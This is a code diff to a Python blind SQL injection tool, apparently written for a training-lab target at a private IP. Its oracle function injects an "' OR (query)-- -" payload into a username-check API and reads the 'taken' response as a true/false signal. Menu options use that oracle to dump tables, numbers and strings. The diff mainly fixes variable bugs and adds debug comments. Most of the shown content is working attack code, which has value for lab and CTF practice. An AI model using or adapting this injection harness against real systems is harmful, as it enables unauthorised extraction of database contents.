@@ -8,6 +8,8 @@ target = "test"
 def oracle(query):
     p = quote_plus(f"{target}' OR ({query})-- -")
     r = requests.get(f"http://10.129.204.197/api/check-username.php?u={p}")
+    #print(request.data)
+    #print(r.text)
     j = json.loads(r.text)
     return j['status'] == 'taken'
 
@@ -54,7 +56,7 @@ Your Option : """))
 if func == 0:
     test()
 
-elif func == 4:
+elif func == 4: 
     table = input("tables : ")
     column = input("column : ")
     results = []
@@ -72,12 +74,12 @@ elif func == 4:
             results.append(row)
     #print(tabulate(results, headers=columns, tablefmt="grid"))
 
-elif func == 5:
+elif func == 5: # sample:
     payload = input("Payload : ")
-    print(dumpNumber(query))
+    print(dumpNumber(payload))
 
-elif func == 6:
+elif func == 6: # sample:
     payload = input("Payload : ")
-    length = dumpNumber(query)
+    length = dumpNumber(payload)
     #string, length = payload.rsplit(maxsplit=1)
-    print(dumpString(string,int(length)))
+    print(dumpString(payload,int(length)))
